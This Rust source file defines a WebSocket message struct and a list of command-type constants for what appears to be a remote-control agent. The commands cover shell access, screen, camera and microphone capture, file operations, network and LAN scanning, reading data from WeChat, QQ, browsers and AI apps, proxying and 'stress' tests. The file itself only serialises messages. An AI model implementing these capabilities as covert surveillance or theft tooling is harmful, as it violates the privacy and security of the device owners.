use serde::{Deserialize, Serialize};
use serde_json::Value;

// ── WebSocket Message ──────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WebSocketMessage {
    #[serde(rename = "type")]
    pub msg_type: String,

    #[serde(default)]
    pub channel: String,

    #[serde(default)]
    pub data: Option<Value>,

    #[serde(rename = "ts", default)]
    pub timestamp: i64,

    #[serde(rename = "rid", default, skip_serializing_if = "Option::is_none")]
    pub request_id: Option<String>,
}

impl WebSocketMessage {
    pub fn new(msg_type: impl Into<String>) -> Self {
        Self {
            msg_type: msg_type.into(),
            channel: String::new(),
            data: None,
            timestamp: chrono_now_millis(),
            request_id: None,
        }
    }

    pub fn with_channel(mut self, channel: impl Into<String>) -> Self {
        self.channel = channel.into();
        self
    }

    pub fn with_data(mut self, data: Value) -> Self {
        self.data = Some(data);
        self
    }

    pub fn with_request_id(mut self, rid: impl Into<String>) -> Self {
        self.request_id = Some(rid.into());
        self
    }

    pub fn to_json(&self) -> String {
        serde_json::to_string(self).unwrap_or_default()
    }

    pub fn from_json(json: &str) -> Option<Self> {
        serde_json::from_str(json).ok()
    }
}

fn chrono_now_millis() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as i64
}

// ── WebSocket Message Type Constants ───────────────────────────────────

pub mod ws_type {
    pub const AGENT_ONLINE: &str = "agent.online";
    pub const AGENT_OFFLINE: &str = "agent.offline";
    pub const TASK_CREATED: &str = "task.created";
    pub const TASK_UPDATED: &str = "task.updated";
    pub const SHELL_INPUT: &str = "shell.input";
    pub const SHELL_OUTPUT: &str = "shell.output";
    pub const SHELL_BIND: &str = "shell.bind";
    pub const SHELL_UNBIND: &str = "shell.unbind";
    pub const SHELL_LOCK_ACQUIRED: &str = "shell.lock.acquired";
    pub const SHELL_LOCK_RELEASED: &str = "shell.lock.released";

    pub const SCREEN_LIST: &str = "screen.list";
    pub const SCREEN_BIND: &str = "screen.bind";
    pub const SCREEN_UNBIND: &str = "screen.unbind";
    pub const SCREEN_CONFIG: &str = "screen.config";
    pub const SCREEN_FRAME: &str = "screen.frame";
    pub const SCREEN_DIFF: &str = "screen.diff";
    pub const SCREEN_ERROR: &str = "screen.error";

    pub const CAMERA_LIST: &str = "camera.list";
    pub const CAMERA_BIND: &str = "camera.bind";
    pub const CAMERA_UNBIND: &str = "camera.unbind";
    pub const CAMERA_CONFIG: &str = "camera.config";
    pub const CAMERA_FRAME: &str = "camera.frame";
    pub const CAMERA_ERROR: &str = "camera.error";

    pub const MIC_LIST: &str = "mic.list";
    pub const MIC_BIND: &str = "mic.bind";
    pub const MIC_UNBIND: &str = "mic.unbind";
    pub const MIC_DATA: &str = "mic.data";
    pub const MIC_ERROR: &str = "mic.error";

    // File operations
    pub const FILE_DRIVES: &str = "file.drives";
    pub const FILE_LIST: &str = "file.list";
    pub const FILE_READ: &str = "file.read";
    pub const FILE_WRITE: &str = "file.write";
    pub const FILE_DELETE: &str = "file.delete";
    pub const FILE_MKDIR: &str = "file.mkdir";
    pub const FILE_RENAME: &str = "file.rename";
    pub const FILE_MOVE: &str = "file.move";
    pub const FILE_COPY: &str = "file.copy";
    pub const FILE_COMPRESS: &str = "file.compress";
    pub const FILE_DECOMPRESS: &str = "file.decompress";
    pub const FILE_SHORTCUT: &str = "file.shortcut";

    // System info
    pub const SYSTEM_PROCESSES: &str = "system.processes";
    pub const SYSTEM_WINDOWS: &str = "system.windows";
    pub const SYSTEM_ENV: &str = "system.env";
    pub const SYSTEM_NETWORK: &str = "system.network";
    pub const SYSTEM_NETWORK_WAN: &str = "system.network.wan";
    pub const SYSTEM_NETWORK_WIFI: &str = "system.network.wifi";
    pub const SYSTEM_NETWORK_NEARBY: &str = "system.network.nearby";
    pub const SYSTEM_NETWORK_PROXY: &str = "system.network.proxy";
    pub const SYSTEM_LANSCAN: &str = "system.lanscan";
    pub const SYSTEM_BLUETOOTH: &str = "system.bluetooth";

    // Other software
    pub const OTHERSOFT_WECHAT: &str = "othersoft.wechat";
    pub const OTHERSOFT_QQ: &str = "othersoft.qq";
    pub const OTHERSOFT_BROWSER: &str = "othersoft.browser";
    pub const OTHERSOFT_AI: &str = "othersoft.ai";

    // Proxy
    pub const PROXY_FETCH: &str = "proxy.fetch";

    // Stress test
    pub const STRESS_START: &str = "stress.start";
    pub const STRESS_STOP: &str = "stress.stop";
    pub const STRESS_STATUS: &str = "stress.status";
    pub const STRESS_UPDATE: &str = "stress.update";
}
